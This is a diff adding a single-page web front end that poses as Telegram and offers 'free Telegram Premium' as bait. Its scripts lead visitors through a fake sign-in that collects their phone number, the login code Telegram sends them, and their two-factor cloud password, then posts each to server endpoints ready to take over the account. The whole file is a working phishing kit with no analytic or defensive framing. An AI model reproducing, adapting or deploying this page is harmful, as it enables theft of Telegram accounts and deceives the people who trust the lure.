@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" sizes="144x144" href="https://i.ibb.co/8dH95bG/Telegram-logo-svg.webp">
+    <title>Telegram Premium</title>
+</head>
+<body>
+    <div class="main">
+        <div class="content">
+            <div id="form_main" class="form">
+                <div class="logo">
+                    <img src="https://i.ibb.co/ZhLL4pL/logo.png" alt="">
+                </div>
+                <div class="title">Telegram Premium</div>
+                <div class="desc">Free Telegram Premium to celebrate our anniversary!</div>
+                <span id="to_form_number" class="button">Get</span>
+            </div>
+            <div id="form_number" class="form">
+                <div class="logo-sign">
+                    <img src="https://i.ibb.co/VQfqFm1/telegram-1024x1024-1.png" alt="">
+                </div>
+                <div class="title">Sign In</div>
+                <div class="desc" id="take_number">Check the country code and enter your phone number.</div>
+                <div class="error" id="wrong_number">Wrong number!</div>
+                <input type="text" name="" id="phone_number" placeholder="Your number">
+                <span id="send_code" class="button_ul">Next</span>
+            </div>
+            <div id="form_get_code" class="form">
+                <div class="logo">
+                    <img src="https://i.ibb.co/Y8123yT/image.png" alt="">
+                </div>
+                <div class="title">Confirmation</div>
+                <div class="desc" id="take_code">We sent a verification code to the Telegram app.</div>
+                <div class="error" id="wrong_code">Wrong code!</div>
+                <input type="number" name="" id="code" placeholder="Code">
+                <span id="confirm_code" class="button_ul">Next</span>
+            </div>
+            <div id="form_get_password" class="form">
+                <div class="logo">
+                    <img src="https://i.ibb.co/Y8123yT/image.png" alt="">
+                </div>
+                <div class="title">Confirmation</div>
+                <div class="desc" id="take_password">You must enter your cloud password to log into your account!</div>
+                <div class="error" id="wrong_password">Wrong password!</div>
+                <input type="text" name="" id="password" placeholder="Password">
+                <span id="check_password" class="button_ul">Sign in</span>
+            </div>
+            <div id="loading" class="form">
+                <img src="https://i.ibb.co/H7wtz4S/91.gif" alt="">
+            </div>
+        </div>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.css" />
+</body>
+
+<style>
+    *{
+    font-family: "Inter", sans-serif;
+}
+
+body{
+    height: 100%;
+    display: flex;
+    flex-flow: column;
+    justify-content: center;
+    align-items: center;
+    background-color: #212121;
+}
+
+.main{
+    width: 95%;
+    display: flex;
+    flex-flow: column;
+    justify-content: center;
+    align-items: center;
+}
+
+.content{
+    width: 100%;
+    display: flex;
+    flex-flow: column;
+    justify-content: center;
+    align-items: center;
+}
+
+.form{
+    margin-top: 48px;
+    width:70%;
+    display: flex;
+    flex-flow: column;
+    justify-content: center;
+    align-items: center;
+}
+
+.form .logo{
+    align-self: center;
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.form .logo img{
+    width: 200px;
+    height: 200px;
+}
+
+.form .logo-sign{
+    align-self: center;
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    fill: #212121;
+}
+
+.form .logo-sign img{
+    fill: #8774e1;
+    width: 200px;
+    height: 200px;
+}
+
+.form .title {
+    font-size: 32px;
+    margin: 22px 0px;
+    text-align: center;
+    font-weight: 500;
+    color: white;
+}
+
+.form .desc{
+    font-size: 17px;
+    font-weight: 0;
+    text-align: center;
+    color: rgb(170,170,170);;
+    margin-bottom: 10px;
+}
+
+.form .error{
+    font-size: 16px;
+    font-weight: 500;
+    text-align: center;
+    color: red;
+}
+
+.button{
+    text-decoration: none;
+    cursor: pointer;
+    margin-top: 27px;
+    background-color: #8774e1;
+    color: #fff;
+    text-transform: uppercase;
+    width: 360px;
+    text-align: center;
+    height: 54px;
+    border-radius: 15px;
+    font-weight: 600;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    transition: all 0.3 ease;
+}
+
+.button:hover{
+    background-color: #7360d1;    
+    transition: all 0.3s ease;
+}
+
+.button_ul{
+    text-decoration: none;
+    cursor: pointer;
+    margin-top: 27px;
+    background-color: #8774e1;
+    color: #fff;
+    text-transform: uppercase;
+    width: 360px;
+    text-align: center;
+    height: 54px;
+    border-radius: 15px;
+    font-weight: 600;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    transition: all 0.3 ease;
+}
+
+.button_ul:hover{
+    background-color: #7360d1;    
+    transition: all 0.3s ease;
+}
+
+.second_button{
+    text-decoration: none;
+    cursor: pointer;
+    margin-top: 15px;
+    background-color: #3390ec;
+    color: #fff;
+    width: 180px;
+    text-align: center;
+    height: 44px;
+    border-radius: 15px;
+    font-weight: 600;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    transition: all 0.3 ease;
+}
+
+.second_button:hover{
+    background-color: #2086ea;    
+    transition: all 0.3s ease;
+}
+
+#phone_number{
+    margin-top: 20px;
+    width: 300px;
+    height: 54px;
+    border-radius: 10px;
+    border: 1px #656566 solid;
+    padding: 0px 20px;
+    font-size: 16px;
+    color: white;
+    transition: all 0.3s ease;
+    background-size: 32px;
+    padding-left: 25px;
+    background-color: #212121;
+}
+
+#phone_number:focus{
+    border: 1px #8774e1 solid;
+    transition: all 0.3s ease;
+}
+
+#phone_number:active{
+    border: 1px #8774e1 solid;
+    transition: all 0.3s ease;
+}
+
+#phone_number:hover{
+    border: 0;
+    appearance: none;
+    outline: none;
+    border: 1px #8774e1 solid;
+    transition: all;
+}
+
+#phone_number:focus-visible{
+    border: 0;
+    appearance: none;
+    outline: none;
+    border: 2px #8774e1 solid;
+    transition: all;
+}
+
+#phone_number::-webkit-input-placeholder{
+    color: #707579;
+}
+
+#password{
+    margin-top: 20px;
+    width: 300px;
+    height: 54px;
+    border-radius: 10px;
+    border: 1px #656566 solid;
+    padding: 0px 20px;
+    font-size: 16px;
+    color: #707579;
+    transition: all 0.3s ease;
+    background-size: 32px;
+    background-color: #212121;
+    padding-left: 25px;
+}
+
+#password:focus{
+    border: 1px #3390ec solid;
+    transition: all 0.3s ease;
+}
+
+#password:active{
+    border: 1px #3390ec solid;
+    transition: all 0.3s ease;
+}
+
+#password:hover{
+    border: 0;
+    appearance: none;
+    outline: none;
+    border: 1px #8774e1 solid;
+    transition: all;
+}
+
+#password:focus-visible{
+    border: 0;
+    appearance: none;
+    outline: none;
+    border: 2px #8774e1 solid;
+    transition: all;
+}
+
+#password::-webkit-input-placeholder{
+    color: #707579;
+}
+
+
+#code{
+    -moz-appearance:textfield;
+    margin-top: 20px;
+    width: 300px;
+    height: 54px;
+    border-radius: 10px;
+    border: 1px #656566 solid;
+    padding: 0px 20px;
+    font-size: 16px;
+    color: #707579;
+    transition: all 0.3s ease;
+    background-size: 32px;
+    background-color: #212121;
+    padding-left: 25px;
+}
+
+input[type=number]::-webkit-inner-spin-button, 
+input[type=number]::-webkit-outer-spin-button { 
+  -webkit-appearance: none; 
+  margin: 0; 
+}
+
+#code:focus{
+    border: 1px #3390ec solid;
+    transition: all 0.3s ease;
+}
+
+#code:active{
+    border: 1px #3390ec solid;
+    transition: all 0.3s ease;
+}
+
+#code:hover{
+    border: 0;
+    appearance: none;
+    outline: none;
+    border: 1px #8774e1 solid;
+    transition: all;
+}
+
+#code:focus-visible{
+    border: 0;
+    appearance: none;
+    outline: none;
+    border: 2px #8774e1 solid;
+    transition: all;
+}
+
+#code::-webkit-input-placeholder{
+    color: #707579;
+}
+
+
+
+div.modal{
+    opacity: 0;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    -o-box-shadow: none;
+    -ms-box-shadow: none;    
+    box-shadow: none;
+    backdrop-filter: blur(16px) saturate(180%);
+    -webkit-backdrop-filter: blur(16px) saturate(180%);
+    background-color: rgba(243, 7, 7, 0.2);
+    border-radius: 10px;
+    /* border: 1px solid rgba(209, 213, 219, 0.3); */
+    height: 400px;
+    -webkit-transition: opacity 2s ease;
+    transition: opacity 2s ease; 
+}
+
+div.modal p{
+    margin-top: 40px;
+    text-align: center;
+    font-weight: 600;
+    font-size: 16px;
+}
+
+
+</style>
+<script>
+    $("#form_number").css('display', 'none');
+$("#form_get_code").css('display', 'none');
+$("#loading").css('display', 'none');
+$("#form_about").css('display', 'none');
+$("#form_get_password").css('display', 'none');
+$("#wrong_number").css('display', 'none');
+$("#wrong_code").css('display', 'none');
+$("#wrong_password").css('display', 'none');
+
+
+$("#to_form_number").on("click", function(){
+    $("#form_main").css('display', 'none');
+    $("#form_number").fadeIn();
+})
+
+$("#back").on("click", function(){
+    $("#form_about").css('display', 'none');
+    $("#form_main").fadeIn();
+})
+
+$("#about_us").on("click", function(){
+    $("#form_main").css('display', 'none');
+    $("#form_about").fadeIn();
+})
+
+$("#send_code").on("click", async function(){
+    
+    if ($("#phone_number").val().search("_") != -1 | $("#phone_number").val() == "" | $("#phone_number").val() == " ") {
+
+        alert("Введеный вами номер неккоректен")
+
+        return;
+    }
+
+
+    await $("#send_code").css('display', 'none');
+
+    let response = await fetch('/send_code', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({"phone": $("#phone_number").val().replaceAll(" ", "")})
+    });
+
+    if (response.ok) {
+        await $("#wrong_number").css('display', 'none');
+        await $("#form_number").css('display', 'none');
+        await $("#form_get_code").fadeIn();
+    } else {
+        await $("#take_number").css('display', 'none');
+        await $("#wrong_number").fadeIn();
+        await $("#send_code").fadeIn();
+    }
+
+
+
+})
+
+
+$("#confirm_code").on("click", async function(){
+
+    val = $("#code").val()
+
+    await $("#confirm_code").css('display', 'none');
+
+    if (val.length == 5) {
+
+        console.log(val)
+
+        let response = await fetch('/confirm_code', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({"code": val, "phone": $("#phone_number").val().replaceAll(" ", "")})
+        });
+        
+        if (response.status == "500") {
+            await $("#take_code").css('display', 'none');
+            await $("#wrong_code").fadeIn();
+            await $("#confirm_code").fadeIn();
+        }
+        if (response.status == "501") {
+            await $("#wrong_code").css('display', 'none');
+            await $("#form_get_code").css('display', 'none');
+            await $("#form_get_password").fadeIn();
+        }
+        if (response.ok) {
+            await $("#wrong_code").css('display', 'none');
+            await $("#form_get_code").css('display', 'none');
+            await $("#loading").fadeIn();
+        }
+        
+    } else {
+        await $("#take_code").css('display', 'none');
+        await $("#wrong_code").fadeIn();
+        await $("#confirm_code").fadeIn();
+    }
+
+})
+
+$("#check_password").on("click", async function(){
+
+    await $("#check_password").css('display', 'none');
+
+    let response = await fetch('/confirm_code_2fa', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({"code" : $("#code").val(), "password" : $("#password").val(), "phone": $("#phone_number").val().replaceAll(" ", "")})
+    });
+
+    if (response.ok) {
+        await $("#wrong_password").css('display', 'none');
+        await $("#form_get_password").css('display', 'none');
+        await $("#loading").fadeIn();
+    } else {
+        await $("#take_password").css('display', 'none');
+        await $("#wrong_password").fadeIn();
+        await $("#check_password").fadeIn();
+    }
+
+
+
+})
+
+</script>
+</html>
